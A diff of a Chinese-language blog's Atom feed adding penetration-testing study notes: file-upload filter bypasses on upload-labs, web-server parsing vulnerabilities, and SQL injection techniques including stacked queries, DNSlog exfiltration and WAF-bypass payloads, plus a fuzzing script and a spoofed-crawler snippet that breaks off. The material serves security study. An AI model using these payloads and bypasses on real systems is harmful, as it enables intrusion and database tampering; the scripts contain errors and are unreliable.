@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://jinqipiaopiao.github.io/</id>
     <title>Gridea</title>
-    <updated>2021-10-07T03:15:22.847Z</updated>
+    <updated>2021-10-12T12:20:09.149Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://jinqipiaopiao.github.io/"/>
     <link rel="self" href="https://jinqipiaopiao.github.io/atom.xml"/>
@@ -10,6 +10,157 @@
     <logo>https://jinqipiaopiao.github.io/images/avatar.png</logo>
     <icon>https://jinqipiaopiao.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Gridea</rights>
+    <entry>
+        <title type="html"><![CDATA[浅谈文件上传漏洞]]></title>
+        <id>https://jinqipiaopiao.github.io/post/qian-tan-wen-jian-shang-chuan-lou-dong/</id>
+        <link href="https://jinqipiaopiao.github.io/post/qian-tan-wen-jian-shang-chuan-lou-dong/">
+        </link>
+        <updated>2021-10-10T01:12:36.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="0x00-文件上传漏洞描述">0x00 文件上传漏洞描述</h1>
+<p><strong>漏洞原理：</strong><br>
+由于程序员在编写代码时候在对用户文件上传功能实现代码上没有严格限制用户上传的文件后缀以及文件类型或者处理缺陷,而导致用户可以越过其本身权限向服务器上上传可执行的动态脚本文件，简单的来说就是服务器端没有对客户端上传的文件进行严格验证或过滤,用户可以上传一个可执行的脚本文件,并通过此脚本获得了执行服务器端命令的能力而引发危害。<br>
+<strong>漏洞危害：</strong><br>
+1.针对上传功能的Dos攻击<br>
+2.使上传文件在服务器上作为脚本执行<br>
+3.诱使用户下载恶意文件<br>
+4.越权下载文件</p>
+<p>一切可以上传文件的位置皆可能存在文件上传漏洞！</p>
+<p><strong>0x01 漏洞的绕过技术总结</strong><br>
+首先将绕过分为前端绕过与后端绕过</p>
+<p>1）前端绕过：</p>
+<p>指数据上传后为提交到服务器，而是由于网站页面的js对其进行过滤，确认是否可以上传,删除限制上传js规则即可</p>
+<p>2）后端绕过：</p>
+<p><strong>黑名单：</strong></p>
+<p>1.特殊解析后缀绕过</p>
+<p>2.htaccess解析绕过</p>
+<p>3.大小写绕过</p>
+<p>4.点绕过</p>
+<p>5.空格绕过</p>
+<p>6.::$$DATA数据流绕过</p>
+<p>7.配合解析绕过</p>
+<p>8.双后缀解析绕过</p>
+<p><strong>白名单：</strong><br>
+1.MIME绕过<br>
+2.%00截断<br>
+3.0x00截断<br>
+4.0x0a截断</p>
+<p><strong>其他类型：</strong></p>
+<p>1.条件头检测</p>
+<p>2.二次渲染</p>
+<p>3.条件竞争</p>
+<p>4.突破getimagesize</p>
+<p>5.突破exif_imagetype</p>
+<p><strong>0x02 黑名单，白名单漏洞绕过技术案例</strong><br>
+<strong>黑名单绕过</strong><br>
+<strong>1）黑名单-特殊解析后缀绕过-upload-labs-03</strong><br>
+黑名单限制php上传，但apache对php3.php5.phtml等也可以直接解析为php，故可将php后缀改为php3等，如果上传成功.php3,如果Apache不能解析，在Apache的配置文件httpd.conf文件中添语句php3即可</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633828436455.png" alt="" loading="lazy"><br>
+上传即可，若解析不超过可能是apache版本过高</p>
+<p><strong>2)黑名单-.htaccess解析绕过-upload-labs-04</strong><br>
+htaccess文件一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。<br>
+.htaccess：apache拓展配置文件，可以与解析文件在同一个目录</p>
+<p>故我们可以先上传htaccess文件，重新命名解析规则，只针对当前目录下<br>
+首先上传htaccess内容为</p>
+<pre><code>none
+&lt;IfModule mime_module&gt;
+SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行
+&lt;/IfModule&gt;
+</code></pre>
+<p>或<br>
+AddType application/x-httpd-php .jpg  #将当前目录下jpg文件当作php运行<br>
+再上传写入php的图片即可</p>
+<p><strong>3）黑名单-大小写绕过-upload-labs-05</strong><br>
+代码未过滤大小写，导致Php可上传后任可解析为php</p>
+<p>** 4）黑名单-加点绕过-upload-labs-07**<br>
+在windows中一个文件的后缀加上一个点与原来的后缀没有区别，从而用来文件上传绕过</p>
+<p><strong>5）黑名单-空格绕过-upload-labs-06</strong><br>
+由于没有对文件后缀名进行去空，因此可以在后缀名加空格绕过，文件属性不会变</p>
+<p><strong>6）黑名单- ::$$DATA数据流绕过-upload-labs-08</strong><br>
+在php+windows的情况下：如果文件名+”::<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">“</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">把</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA“会把::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord">“</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">把</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant="normal">“</mi><mi mathvariant="normal">之</mi><mi mathvariant="normal">前</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">例</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">：</mi><mn>1.</mn><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA“之前的文件名。
+例如：1.php::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">A</span><span class="mord">“</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">：</span><span class="mord">1</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>$DATA<br>
+<strong>1) 黑名单-配合解析绕过 upload-labs-9</strong><br>
+由于代码对文件名最后是进行拼接的，可以伪造文件名<br>
+代码先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar函数来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过或者为</p>
+<p><strong>8）黑名单-双后缀解析 upload-labs-10</strong><br>
+由于代码函数逻辑原因，1.pphphp 最后经过函数过滤完又恢复为1.php从而绕过。具体还是要代码审计，查找配合解析漏洞</p>
+<p><strong>白名单绕过</strong></p>
+<p><strong>1）白名单-MIME绕过-uplod-labs-02</strong><br>
+MIME即为Content-Type: image/gif 在有些时候对MIME有过滤，即可将允许上传文件MIMEcopy给要上传的文件属性，从而实现绕过</p>
+<p><strong>2）白名单-%00截断-upload-labs–11</strong><br>
+截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态<br>
+%00截断用在数据包的文件url地址上面，在url地址文件地址后加上阶段即可</p>
+<p>例：/upload/1.php%00 使拼接无法实现 原来图片包含文件内容将写入1.php ，访问1.php即可</p>
+<p><strong>3）白名单-0x00截断-upload-labs-12</strong><br>
+save_path参数通过POST方式传递，还是利用00截断，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。<br>
+由于get请求会对一些字符自动解码，而在post传递，不会对字符解码，故需要我们自己转换<br>
+这种截断不同于%00，它是在数据包中间的文件地址，文件名后截断</p>
+<p><strong>4）白名单-0x0a截断-</strong><br>
+换行 代码：LF ASCII码：/ n ，十六进制，0x0a，换行至下一行行首起始位置</p>
+<p><strong>0x03 其他类型绕过</strong><br>
+1）文件头检测绕过<br>
+图片文件以字符展示出来时候，每一种格式的图片的前几个字符是固定，或者是数据包里面的Content-Type类型修改，从而绕过上传</p>
+<p><strong>2）二次渲染上传绕过-upload-labs-16</strong><br>
+在我们将文件上传到服务器，有一些服务器会对上传的文件进行二次修改，以服务器的类型储存起来，但是文件的外表不会变化，文件的hex值会发生一些变化，在upload-16关，发现服务器对我们上传的问价进行二次渲染，当我们之前将一句话木马插入经过服务器储存后再次查看hex值发现很多地方的值发生改变，我们经过原图片hex值对比，发现会有不会改变的值，我们将木马插入到这一串不会改变的值的位置里面，从而实现上传webshell</p>
+<p><strong>3）条件竞争绕过-upload-labs-17</strong><br>
+竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。思路是首先上传一个php文件，当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
+<p><strong>4）突破getimagesize 绕过-upload-labs-14</strong><br>
+getimagesize这个函数功能会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的<br>
+上传图片马，写入代码到图片，使用文件包含漏洞，访问该图片地址 http://127.0.0.1/include.php?file=upload/5220200729141211.jpeg，查看到 phpinfo</p>
+<p><strong>5）突破exif_imagetype绕过-upload-labs-15</strong><br>
+exif_imagetype() 读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值跟getimagesize() 返回的数组中的索引 2 的值是一样的，但exif_imagetype函数快得多，同getimagesize函数一样，也是修改文件头信息，配合文件包含漏洞上传</p>
+<p>来源: 我就是告白<br>
+文章作者: Hsy.Sec<br>
+文章链接: http://kxsy.work/2021/07/13/wen-jian-shang-chuan-lou-dong/<br>
+本文章著作权归作者所有，任何形式的转载都请注明出处。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[常见的解析漏洞总结]]></title>
+        <id>https://jinqipiaopiao.github.io/post/chang-jian-de-jie-xi-lou-dong-zong-jie/</id>
+        <link href="https://jinqipiaopiao.github.io/post/chang-jian-de-jie-xi-lou-dong-zong-jie/">
+        </link>
+        <updated>2021-10-10T01:11:39.000Z</updated>
+        <content type="html"><![CDATA[<p>一、解析漏洞<br>
+解析漏洞指的是服务器应用程序在解析某些精心构造的后缀文件时，会将其解析成网页脚本，从而导致网站的沦陷。大部分解析漏洞的产生都是由应用程序本身的漏洞导致的。</p>
+<p>二、常见的解析漏洞<br>
+1、IIS5.x-6.x解析漏洞<br>
+使用 IIS5.x-6.x 版本的服务器，大多为Windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，不能解析aspx文件。</p>
+<p>目录解析漏洞</p>
+<pre><code>      IIS6.0中的目录解析漏洞，如果网站目录中有一个 *.asp/ 的文件夹，那么该文件夹下面的一切内容都会被 IIS 当作 asp 脚本来执行，如/xx.asp/xx.jpg
+</code></pre>
+<p>文件解析漏洞</p>
+<pre><code>      IIS6.0中的分号（;）漏洞，IIS在解析文件名的时候会将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg
+</code></pre>
+<p>解析文件类型</p>
+<p>IIS6.0 默认的可执行文件除了asp还包含这三种 :</p>
+<p>/test.asa<br>
+/test.cer<br>
+/test.cdx<br>
+2、IIS 7.0/IIS 7.5/Nginx &lt; 8.03<br>
+IIS 7.0/7.5，默认 Fast-CGI 开启。如果直接在 url 中图片地址<code>（*.jpg）后面输入/*.php</code>，会把正常图片解析为 php 文件。</p>
+<pre><code>     在某些使用Nginx的网站中，访问http://www.xxser.com/1.jpg/1.php，1.jpg会被当作PHP脚本来解析，此时1.php是不存在的。这就意味着攻击者可以上传合法的“图片”（图片木马），然后在URL后面加上“/xxx.php”，就可以获得网站的WebShell。
+
+    这不是Nginx特有的漏洞，在IIS7.0、IIS7.5、Lighttpd等Web容器中也经常会出现这样的解析漏洞。这个解析漏洞其实是PHP CGI的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于C:wampbinphpphp5.3.10php.ini，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。
+</code></pre>
+<p>3、Nginx空字节漏洞<br>
+影响版本：0.5、0.6、0.7&lt;=0.7.65、0.8&lt;= 0.8.37</p>
+<pre><code>    Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：
+</code></pre>
+<p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
+<pre><code>     也就是当Fast-CGI执行php时，http://127.0.0.1/1.jpg%00.php 会把1.jpg文件（木马文件）当做php文件来执行。
+</code></pre>
+<p>4、Apache（1.x、2.x）解析漏洞<br>
+Apache（1.x,2.x）解析文件的原则：Apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar、gif等扩展名是Apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的。</p>
+<pre><code>     假如上传文件1.php.bb.rar，后缀名rar不认识，向前解析；1.php.bb，后缀名bb不认识，向前解析；1.php 最终解析结果为php文件。如果解析完还没有碰到可以解析的扩展名，就会暴露源文件。
+
+     这种方法可以绕过基于黑名单的检查。（如网站限制,不允许上传后缀名为php的文件）
+</code></pre>
+<p>5、其他<br>
+在Windows环境下，<code>xx.jpg[空格]</code> 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，Windows会默认除去空格或点。黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单，若上传成功，空格和点都会被Windows自动消除，这样就可以getshell。</p>
+<p>三、漏洞的修复<br>
+及时更新安全补丁，随时关注最新的安全技术，及时关闭一些没有必要开启的服务。</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[2021-9-4开学笔记]]></title>
         <id>https://jinqipiaopiao.github.io/post/2021-9-4-kai-xue-bi-ji/</id>
@@ -955,7 +1106,7 @@ https://blog.csdn.net/qq_39936434/category_9103379.html、
 <h1 id="2021-10-07">2021-10-07</h1>
 <p>WEB漏洞-SQL注入之查询方式及报错盲注<br>
 当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好地选择对应的注入语句。</p>
-<p>1<br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633661356824.png" alt="" loading="lazy"><br>
 补充：Access暴力猜解不出的问题？</p>
 <p>Access偏移注入：解决列名获取不到的情况</p>
 <p>在已知表名不知列名的前提下（表名admin）</p>
@@ -1129,6 +1280,527 @@ ord=ascii ascii(x)=97     判断x的ascii码是否等于97
 <p>12种报错注入+万能语句：https://www.jianshu.com/p/bc35f8dd4f7c</p>
 <p>Order by排序注入方法小总结：https://www.jianshu.com/p/fcae21926e5c</p>
 <p>asp+access注入源码：https://pan.baidu.com/s/1IX6emxDpvYrVZbQzJbHn3g 提取码：l9f6 作者：shtome https://www.bilibili.com/read/cv12614611/ 出处：bilibili</p>
+<h1 id="2021-10-08">2021-10-08</h1>
+<h1 id="web漏洞-二次加解密dns等注入">WEB漏洞-二次,加解密,DNS等注入</h1>
+<p>#加解密，二次，DNSlog注入<br>
+注入原理，演示案例，实际应用(中转注入)</p>
+<p>sqlilabs-less21-cookie&amp;加解密注入<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663517663.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663522462.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663525995.png" alt="" loading="lazy"></p>
+<p>Decode as base64，把%3D改成=号，得出结果。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663529093.png" alt="" loading="lazy"></p>
+<p>注入点在cookie，输入' and 1=1 要进行base64加密处理<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663533785.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663538378.png" alt="" loading="lazy"></p>
+<p>接收cookie值uname赋予给cookee，对cookee进行base64_decode解码，解码之后带入数据库中。注入语句要还原它的加密方式，把注入语句按照它的加密方式进行加密，然后再提交<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663552278.png" alt="" loading="lazy"></p>
+<p>演示</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633663556536.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663561681.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663566406.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663571256.png" alt="" loading="lazy"></p>
+<p>实例</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633663579757.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663588120.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663593531.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663598992.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663603030.png" alt="" loading="lazy"></p>
+<p><strong>sqlilabs-less24-post登录框&amp;二次注入</strong><br>
+二次注入无法通过扫描工具或者代码自己手工测试出来的，二次注入一般会产生在网站程序源代码才会发现的注入漏洞，从前端或者黑盒测试是看不到这个漏洞。<br>
+二次注入原理，主要分为两步：<br>
+第一步：插入恶意数据<br>
+第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。<br>
+第二步：引用恶意数据<br>
+在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p>
+<figure data-type="image" tabindex="14"><img src="https://jinqipiaopiao.github.io//post-images/1633663608196.png" alt="" loading="lazy"></figure>
+<p>注册新用户</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633663707056.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663620349.png" alt="" loading="lazy"></p>
+<p>登录进行修改密码界面，把原始密码123456修改成xxxxxx</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633663714025.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663719957.png" alt="" loading="lazy"></p>
+<p>修改完成，查看数据库，修改密码的账号为dhakkan</p>
+<figure data-type="image" tabindex="15"><img src="https://jinqipiaopiao.github.io//post-images/1633663725446.png" alt="" loading="lazy"></figure>
+<p>查看源码</p>
+<figure data-type="image" tabindex="16"><img src="https://jinqipiaopiao.github.io//post-images/1633663739786.png" alt="" loading="lazy"></figure>
+<p>插入语句中是没有单引号的，所以不会屏蔽，后来修改密码用的是update语句，这个语句有单引号。</p>
+<p><strong>sqlilabs-less9-load_file&amp;dnslog带外注入</strong></p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633663748466.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663754245.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663759018.png" alt="" loading="lazy"></p>
+<p><strong>py-DnslogSqlinj-dnslog诸如演示脚本演示</strong><br>
+工具：https://github.com/ADOOO/DnslogSqlinj</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633663764881.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663772649.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633663778378.png" alt="" loading="lazy"></p>
+<p><strong>py-DnslogSqlinj-dnslog诸如演示脚本演示</strong><br>
+工具：https://github.com/ADOOO/DnslogSqlinj</p>
+<h1 id="web漏洞-sql注入之堆叠及waf绕过注入">WEB漏洞-SQL注入之堆叠及WAF绕过注入</h1>
+<figure data-type="image" tabindex="17"><img src="https://jinqipiaopiao.github.io//post-images/1633665500039.png" alt="" loading="lazy"></figure>
+<p>** 堆叠查询注入**<br>
+Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆sql语句(多条)一起执行。而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。<br>
+堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎的不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些数据。</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633665505654.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633665508860.png" alt="" loading="lazy"></p>
+<p><strong>Sqlilabs-Less38-堆叠注入(多语句)</strong></p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-38/?id=1';insert into users(id,username,password) values ('38','less38','hello')--+
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633665512922.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633665517183.png" alt="" loading="lazy"></p>
+<p>注入需要管理员账号密码，密码是加密，无法解密，使用堆叠注入进行插入数据，用户密码自定义的，可以正常解密登录。<br>
+mtype:会员类别</p>
+<figure data-type="image" tabindex="18"><img src="https://jinqipiaopiao.github.io//post-images/1633665522600.png" alt="" loading="lazy"></figure>
+<p>WAF部署-安全狗，宝塔等waf搭建部署<br>
+不是拦截部分，是拦截database()整体<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633665527093.png" alt="" loading="lazy"><br>
+绕过思路：拆分<br>
+Mysql特有注释符<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633665531452.png" alt="" loading="lazy"><br>
+GET提交方式拦截，union select联合查询被拦截<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633665534655.png" alt="" loading="lazy"></p>
+<pre><code>在mysql的语法中，有三种注释方法：--
+和#（单行注释）和 /* */（多行注释）如果在/*后加惊叹号!意为/* */里的语句将被执行
+在mysql中 /*! ....*/ 不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在/*!....*/中，这样这些语句如果在其他数据库中是不会被执行，但在mysql中它会执行。如下语句/*!50001 select * from test */;这里的50001表示假如 数据库是5.00.01及以上版本，该语句才会被执行。
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633665539620.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633665544783.png" alt="" loading="lazy"></p>
+<p>phostudy+safedog安装找不到服务解决<br>
+市面上常见的waf产品列表分析-wafw00f<br>
+部分bypass sqlinject payload</p>
+<pre><code>id=1 union/*%00*/%23a%0a/*!/*!select 1,2,3*/;%23
+id=1 union/*%00*/%23a%0a/*!/*!select%201,database%23x%0A(),3*/;%23
+
+id=-1%20union%20/*!44509select*?%201,2,3%23
+id=-1%20union%20/*!44509select*?%201,%23x%0A/*!database*?(),3%23
+
+id=1?**&amp;id=-1%20union%20select%201,2,3%23*/
+
+id=-1 %20union%20all%23%0a%20select%201,2,3%23
+-1 %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23
+</code></pre>
+<p>市面上常见的waf产品列表 - wafw00f<br>
+阿里云盾，安全狗，阿里云盾<br>
+遇到WAF先手测，工具一扫就会封IP。<br>
+测试绕过就是研究哪方面没有进行过滤</p>
+<p>提交方式绕过WAF，前提支持各种方式的接受</p>
+<p>（等价函数，特殊函数）：既需要绕过匹配规则，还要不干扰语句的运行结果。</p>
+<p>反序列化的格式进行绕过，注释符混用</p>
+<p>%0a换行  %23注释#<br>
+部分bypass sqlinject payload<br>
+特殊符号，换行绕狗子<br>
+id = 1 union %23a%0A select 1,2,3 #<br>
+匹配到union然后注释，安全认为句子结束，  union a select 狗子不会拦截<br>
+union #a                         写#屏蔽a，换行让union select执行<br>
+select 1,2,3 #</p>
+<pre><code>  注释符混用，参数污染绕狗子
+		
+
+		参数污染只接受后面的，?id=1/**&amp;id=-1 unio select 1,2,3 #*/              /***/ SQL里面的注释符
+			1/**&amp;id=-1 unio select 1,2,3 #*/        狗子接收的
+			-1 unio select 1,2,3 #*/       执行的语句  （内联注释）
+			狗子匹配第一条，其中的注释符号起到注释作用，正常情况没法执行，安全狗直接忽略，
+			参数污染导致的真实数据是执行的语句，能够正常执行SQL语句
+</code></pre>
+<p>fuzz模糊测试，类似爆破密码。某个点生成字典，不断测试。写好脚本和字典批量化进行测试</p>
+<pre><code>	import request
+	import time
+	
+	
+	url = 'http://1.1.1.1/sqli-labs/less2/?id=1'
+	for sqlin in open('uniobselect.txt')
+		urls = url + sqlin
+		result = requests.get(urls).text
+		if (result.find('safedog')==-1):
+			print(sqlin)
+		time.sleep(-1)
+</code></pre>
+<p>堆叠注入详解：https://www.cnblogs.com/backlion/p/9721687.html</p>
+<p>应用层<br>
+大小写/关键字替换<br>
+id=1 UnIoN/<strong>/SeLeCT 1,user()<br>
+hex() bin() 等价于ascii<br>
+sleep()等价于benchmark()<br>
+Mid()substring() 等价于 substr()<br>
+@@user() 等价于User()<br>
+@@version等价于version()<br>
+各种编码：<br>
+大小写,URL,hex,%0A等<br>
+注释使用：<br>
+// --  --+ # /</strong>/ + :%00 /!**/等<br>
+再次循环<br>
+union==uunionnion<br>
+等价替换：<br>
+user()=@@user() and=&amp; or=| ascii=hex等<br>
+参数污染：<br>
+?id=1&amp;id=2&amp;id=3<br>
+编码及解码：<br>
+s-&gt;%73-&gt;%25%37%33<br>
+更改请求提交方式：<br>
+GET,POST,COOKIE<br>
+POST-&gt;multipart/from-data</p>
+<pre><code>中间件参数污染
+</code></pre>
+<p>数据库特性：<br>
+1.mysql技巧</p>
+<pre><code>	（1）mysql注释有三种，#，/*...*/,-- ... （--后加空格）
+	 （2）空格符：0x9a,0x0a-0x0d,0x20,0xa0
+	 (3)特殊符号 0a%换行符
+		可结合注释符使用 %23%0a，%2d%2d%0a
+	 （4）内联注释
+		/*! union12345select*/ 1,user()   //数字范围1000-50540
+	  （5）mysql黑语法
+		 select {x username} from {x11 test.admin};
+</code></pre>
+<p>2.sqlsever</p>
+<pre><code>	 (1)用来注释掉后查询的其余部分
+		/*   c语言风格注释
+		-- sql注释
+		；00%空字节
+	  (2)空白符：[0x01-0x20]
+	 (3)特殊符号：%3a  冒号
+		id = 1 union:select 1,2 from:admin
+	(4)函数变型：如db_name [空白字符]（）
+</code></pre>
+<p>3.oracle技巧</p>
+<pre><code>(1) 注释符：--，/**/
+(2) 空白字符：[0x00,0x09,0x0a-0x0d,0x20]
+
+4.配合fuzz
+select * from admin where id=1 [位置一] union [位置二] select [位置三] 1,2，db_name() [位置四] from [位置五] admin
+</code></pre>
+<p>逻辑层<br>
+（1）云waf防护，一般我们会尝试查找真实站点的真实ip，从而绕过CDN防护<br>
+（2）当提交，GET，POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入，可尝试bypass，<br>
+（3）http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护<br>
+（4）特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害输入，从而导致bypass<br>
+比如：id=1%00and 1=2 union select 1,2,column_name from imformation_schema.columns<br>
+白名单<br>
+方式一：ip白名单</p>
+<pre><code>		从网络层获取来的ip，是无法伪造的，如果获取客户端的ip，这样就可能存在伪造ip绕过的情况。
+		
+		测试方法：
+			修改http的header来bypass waf
+			x-forwarded-for
+			x-remote-ip
+			x-originating-ip
+			x-remote-addr
+			x-real-ip
+</code></pre>
+<p>方式二：静态资源</p>
+<pre><code>			特定的后缀资源静态请求，常见的静态文件，（.js  .jpg  .swf  .css 等），类似白名单机制，
+			waf为了检测效率，不去检测这样一些静态文件后缀的请求。
+</code></pre>
+<p>方式三：url白名单</p>
+<pre><code>			为了防止误拦截，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在的白名单的字符，就作为白名单不检测。
+</code></pre>
+<p>方式四：爬虫白名单</p>
+<pre><code>			部分waf对爬虫结果会忽略，waf如果识别出了搜索引擎来爬虫，waf就会放行
+		
+				import json
+				import request
+				
+				url = 'http://1.1.1.1:8080'
+				head={
+					'user-agent':'mozilla/5.0(compatible;badiduspider-render/2.0;)'
